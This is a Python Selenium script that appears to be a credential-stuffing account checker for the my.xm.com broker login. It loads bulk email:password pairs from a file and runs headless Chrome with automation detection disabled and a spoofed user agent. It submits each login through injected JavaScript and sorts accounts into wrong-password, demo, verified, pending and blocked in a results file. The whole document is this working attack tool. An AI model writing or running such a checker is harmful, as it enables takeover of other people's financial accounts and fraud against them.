from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager
import time
import pickle
import os

COOKIE_FILE = "cookies.pkl"

def read_accounts(file_path):
    with open(file_path, "r") as file:
        return [line.strip().split(":") for line in file.readlines()]

def save_cookies(driver):
    with open(COOKIE_FILE, "wb") as file:
        pickle.dump(driver.get_cookies(), file)

def load_cookies(driver):
    if os.path.exists(COOKIE_FILE):
        driver.get("https://my.xm.com")
        with open(COOKIE_FILE, "rb") as file:
            cookies = pickle.load(file)
            for cookie in cookies:
                driver.add_cookie(cookie)
    return driver

def check_account_status(accounts, output_file):
    chrome_options = Options()
    chrome_options.add_argument("--headless=new")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--disable-blink-features=AutomationControlled")
    chrome_options.add_argument("--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36")
    chrome_options.add_argument("--disable-http2")
    chrome_options.add_argument("--ignore-certificate-errors")
    chrome_options.add_argument("--disable-webusb")
    chrome_options.add_argument("--disable-features=WebUsb")
    chrome_options.add_argument("--disable-machine-learning")
    chrome_options.add_argument("--disable-background-networking")
    chrome_options.add_argument("--disable-background-timer-throttling")
    chrome_options.add_argument("--disable-backgrounding-occluded-windows")
    chrome_options.add_argument("--disable-breakpad")
    chrome_options.add_argument("--disable-component-update")
    chrome_options.add_argument("--disable-domain-reliability")
    chrome_options.add_argument("--disable-sync")
    chrome_options.add_argument("--metrics-recording-only")
    chrome_options.add_argument("--no-default-browser-check")
    chrome_options.add_argument("--no-first-run")
    chrome_options.add_argument("--safebrowsing-disable-auto-update")
    chrome_options.add_argument("--disable-client-side-phishing-detection")
    chrome_options.add_argument("--disable-default-apps")
    chrome_options.add_argument("--disable-extensions")
    chrome_options.add_argument("--disable-hang-monitor")
    chrome_options.add_argument("--disable-popup-blocking")
    chrome_options.add_argument("--disable-prompt-on-repost")
    chrome_options.add_argument("--disable-renderer-backgrounding")
    chrome_options.add_argument("--disable-translate")
    chrome_options.add_argument("--force-fieldtrials=*BackgroundTracing/default/")
    chrome_options.add_argument("--log-level=3")
    chrome_options.add_argument("--block-new-web-contents")
    chrome_options.add_experimental_option("excludeSwitches", ["enable-logging"])

    driver = webdriver.Chrome(
        service=Service(ChromeDriverManager().install()),
        options=chrome_options
    )
    wait = WebDriverWait(driver, 7)  # Reduced overall wait time

    # Cookie handling
    if not os.path.exists(COOKIE_FILE):
        driver.get("https://my.xm.com/member/login")
        try:
            cookie_btn = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "button.js-acceptAllCookies")))
            cookie_btn.click()
            wait.until(EC.invisibility_of_element(cookie_btn))
        except:
            pass
        save_cookies(driver)
    else:
        driver.get("https://my.xm.com")
        load_cookies(driver)
        driver.refresh()

    for index, (email, password) in enumerate(accounts, 1):
        start_time = time.time()
        result = None
        try:
            print(f"[{index}/{len(accounts)}] Checking {email}...", flush=True)
            
            # Fast login with direct JavaScript execution
            driver.get("https://my.xm.com/member/login")
            driver.execute_script(f"""
                document.getElementById('login_user').value = '{email}';
                document.getElementById('login_pass').value = '{password}';
                document.querySelector('button[type="submit"]').click();
            """)

            # Combined detection with timeout optimization
            try:
                # First check for demo account (3 second timeout)
                demo_badge = WebDriverWait(driver, 3).until(
                    EC.visibility_of_element_located((By.CSS_SELECTOR, "span.xm-badge-active:contains('Demo')"))
                )
                result = f"{email}: Demo"
            except:
                # Then check for login errors (2 second timeout)
                try:
                    error_msg = WebDriverWait(driver, 2).until(
                        EC.visibility_of_element_located((By.CSS_SELECTOR, "li:contains('incorrect')"))
                    )
                    result = f"{email}: Wrong Password"
                except:
                    # Finally check real account status
                    driver.execute_script("document.querySelector('div.relative.inline-flex.items-center.justify-center.w-10.h-10').click()")
                    
                    # Fast status check (3 second timeout)
                    status_element = WebDriverWait(driver, 3).until(
                        EC.visibility_of_element_located((By.CSS_SELECTOR, 
                            "span.xm-badge-clarify, "
                            "span.xm-badge-success, "
                            "span.xm-badge-pending, "
                            "span.xm-badge-danger"
                        ))
                    )
                    class_name = status_element.get_attribute("class")
                    
                    if "xm-badge-clarify" in class_name:
                        result = f"{email}: Clarification Needed"
                    elif "xm-badge-success" in class_name:
                        result = f"{email}: ✅"
                    elif "xm-badge-pending" in class_name:
                        result = f"{email}: 🔄"
                    elif "xm-badge-danger" in class_name:
                        result = f"{email}: ⛔"
                    else:
                        result = f"{email}: Unknown Status"

        except Exception as e:
            result = f"{email}: Error - {str(e)[:30]}"

        finally:
            with open(output_file, "a", encoding="utf-8") as file:
                file.write(f"{result}\n")
            print(f"Completed in {time.time()-start_time:.1f}s - {result}")
            
            # Fast logout without cleanup
            driver.get("https://my.xm.com/member/logout")
    
    with open(output_file, "a", encoding="utf-8") as file:
        file.write("#_________________________________________________#\n")
    
    driver.quit()

if __name__ == "__main__":
    accounts = read_accounts("accounts.txt")
    check_account_status(accounts, "results.txt")
